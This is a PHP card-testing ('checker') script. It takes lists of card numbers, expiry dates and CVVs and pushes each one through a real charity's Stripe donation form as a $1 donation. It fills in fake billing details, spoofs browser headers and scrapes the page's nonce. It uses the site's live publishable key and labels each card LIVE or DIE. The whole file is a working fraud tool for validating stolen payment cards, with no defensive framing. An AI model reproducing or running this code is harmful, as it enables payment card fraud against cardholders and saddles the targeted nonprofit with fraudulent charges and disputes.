<?php
date_default_timezone_set('America/Sao_Paulo');

error_reporting(0);
session_start(); session_write_close();
$start = microtime(true);
$useragent = "Mozilla/5.0 (Windows NT " . rand(6, 10) . ".0; Win64; x64) AppleWebKit/" . rand(500, 600) . ".0 (KHTML, like Gecko) Chrome/" . rand(100, 120) . ".0." . rand(4000, 5000) . "." . rand(100, 300) . " Safari/" . rand(500, 600) . ".0";

function generateRandomData() {
    $firstNames = ['John', 'Jane', 'Robert', 'Emily', 'Michael', 'Sarah', 'David', 'Lisa', 'James', 'Karen'];
    $lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller', 'Davis', 'Garcia', 'Rodriguez', 'Wilson'];
    $cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'San Jose'];
    $streets = ['Main St', 'Oak Ave', 'Maple Rd', 'Elm St', 'Cedar Ln', 'Pine St', 'Washington Ave', 'Park Blvd', 'Lake View Dr', 'Sunset Blvd'];
   
    $firstName = $firstNames[array_rand($firstNames)];
    $lastName = $lastNames[array_rand($lastNames)];
    $city = $cities[array_rand($cities)];
    $streetNumber = rand(100, 9999);
    $street = $streetNumber . ' ' . $streets[array_rand($streets)];
    $zipcode = rand(10000, 99999);
    $phone = rand(200, 999) . rand(200, 999) . rand(1000, 9999);
    
    $emailProviders = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com'];
    $email = strtolower($firstName . '.' . $lastName . rand(1, 99) . '@' . $emailProviders[array_rand($emailProviders)]);
    
    return [
        'firstname' => $firstName,
        'lastname' => $lastName,
        'name' => $firstName . ' ' . $lastName,
        'city' => $city,
        'street' => $street,
        'zipcode' => $zipcode,
        'phone' => $phone,
        'email' => $email
    ];
}

function WSLZIMM7($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$lista = @$_POST['lista'] ?: @$_GET['lista'];
if (!$lista) exit;
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$bin = substr($cc, 0, 6);

$randomData = generateRandomData();
$name = $randomData['firstname'];
$last = $randomData['lastname'];
$city = $randomData['city'];
$street = $randomData['street'];
$zipcode = $randomData['zipcode'];
$phone = $randomData['phone'];
$email = $randomData['email'];

if (file_exists("WSLZIMM7gang.txt")) {
    unlink("WSLZIMM7gang.txt");
}

$first_digit = substr($cc, 0, 1);
if ($first_digit == "4") {
    $cc_type = "VI";
} elseif ($first_digit == "5") {
    $cc_type = "MC";
} elseif ($first_digit == "3") {
    $cc_type = "AX";
} elseif ($first_digit == "6") {
    $cc_type = "DC";
} else {
    $cc_type = "VI";
}

$last4 = substr($cc, -4);

$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/WSLZIMM7gang.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/WSLZIMM7gang.txt');
curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

curl_setopt($ch, CURLOPT_URL, 'https://hopeinlancaster.org/donations/');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
));
$donation = curl_exec($ch);
$ds_nonce = WSLZIMM7($donation, 'ds_nonce":"', '"');

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: api.stripe.com',
    'sec-ch-ua-platform: "Windows"',
    'accept: application/json',
    'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'content-type: application/x-www-form-urlencoded',
    'sec-ch-ua-mobile: ?0',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'accept-language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'priority: u=1, i',
    'Accept-Encoding: gzip',
));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[email]='.$email.'&billing_details[address][postal_code]='.$zipcode.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=28ef50fe-17ac-4431-80ea-21cd80f14037e3f5cc&muid=d6440daa-35a2-4e17-8a21-68d04221b0f1dcc5ef&sid=51e13ee4-986f-41d3-98b4-a8f6dce0f275e0b013&pasted_fields=number&payment_user_agent=stripe.js%2F250b377966%3B+stripe-js-v3%2F250b377966%3B+card-element&referrer=https%3A%2F%2Fhopeinlancaster.org&time_on_page=25171&client_attribution_metadata[client_session_id]=f3e456ae-44cb-4ec1-a8db-bfc8569a1a5b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_QMBU860cL1m4otZJNXjcDFyq');

$pagardonate = curl_exec($ch);
$pmtoken = WSLZIMM7($pagardonate, 'id": "','"');

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: api.stripe.com',
    'sec-ch-ua-platform: "Windows"',
    'accept: application/json',
    'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'content-type: application/x-www-form-urlencoded',
    'sec-ch-ua-mobile: ?0',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'accept-language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'priority: u=1, i',
    'Accept-Encoding: gzip',
));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'guid=28ef50fe-17ac-4431-80ea-21cd80f14037e3f5cc&muid=d6440daa-35a2-4e17-8a21-68d04221b0f1dcc5ef&sid=51e13ee4-986f-41d3-98b4-a8f6dce0f275e0b013&referrer=https%3A%2F%2Fhopeinlancaster.org&time_on_page=37884&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]='.$zipcode.'&payment_user_agent=stripe.js%2F250b377966%3B+stripe-js-v3%2F250b377966%3B+card-element&pasted_fields=number&client_attribution_metadata[client_session_id]=f3e456ae-44cb-4ec1-a8db-bfc8569a1a5b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=985a134f-7a77-4ada-bb68-0e2a3d79f2c2&key=pk_live_QMBU860cL1m4otZJNXjcDFyq');
$receberdonate = curl_exec($ch);
$token = WSLZIMM7($receberdonate, 'id": "', '"');

curl_setopt($ch, CURLOPT_URL, 'https://hopeinlancaster.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: hopeinlancaster.org',
    'sec-ch-ua-platform: "Windows"',
    'x-requested-with: XMLHttpRequest',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    'accept: */*',
    'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'sec-ch-ua-mobile: ?0',
    'origin: https://hopeinlancaster.org',
    'referer: https://hopeinlancaster.org/donations/',
    'accept-language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'priority: u=1, i',
    'Accept-Encoding: gzip',
));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=ds_process_button&stripeToken='.$token.'&paymentMethodID='.$pmtoken.'&allData%5BbillingDetails%5D%5Bemail%5D='.$email.'&type=donation&amount=1&params%5Bvalue%5D=ds-1550085882883&params%5Bname%5D=HOPE+In+Lancaster%2C+Inc&params%5Bamount%5D=MC41&params%5Boriginal_amount%5D=1&params%5Bdescription%5D=One-Time+Donation&params%5Bpanellabel%5D=Confirm+Payment&params%5Btype%5D=donation&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=&params%5Bcapture%5D=1&params%5Bdisplay_amount%5D=1&params%5Bcurrency%5D=USD&params%5Blocale%5D=&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=https%3A%2F%2Fhopeinlancaster.org%2Fsuccess&params%5Berror_url%5D=https%3A%2F%2Fhopeinlancaster.org%2Ffail&params%5Bbutton_id%5D=MyButton&params%5Bcustom_role%5D=&params%5Bbilling%5D=&params%5Bshipping%5D=&params%5Brememberme%5D=&params%5Bkey%5D=pk_live_QMBU860cL1m4otZJNXjcDFyq&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Fhopeinlancaster.org%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=https%3A%2F%2Fwww.hopeinlancaster.org%2Fwp-content%2Fuploads%2F2016%2F03%2FHOPE-LOGO.png&params%5Binstance%5D=ds1550085882883&params%5Bds_nonce%5D='.$ds_nonce.'&ds_nonce='.$ds_nonce);
$retorno = curl_exec($ch);
$message = WSLZIMM7($retorno, '"message":"','"');
$tempo = round(microtime(true) - $start, 2);

if(strpos($retorno, 'hopeinlancaster.org\/success') !== false) { 
    echo "LIVE | " . $cc . "|" . $mes . "|" . $ano . "|" . $cvv . " | APROVADA | " . $tempo . "s\n";
} elseif(strpos($retorno, 'security code is invalid.') !== false || strpos($retorno, 'security code is incorrect.') !== false) {
    echo "DIE | " . $cc . "|" . $mes . "|" . $ano . "|" . $cvv . " | CVV INVÁLIDO | " . $tempo . "s\n";
} else {	
    echo "DIE | " . $cc . "|" . $mes . "|" . $ano . "|" . $cvv . " | " . $message . " | " . $tempo . "s\n";
}

curl_close($ch);
?>
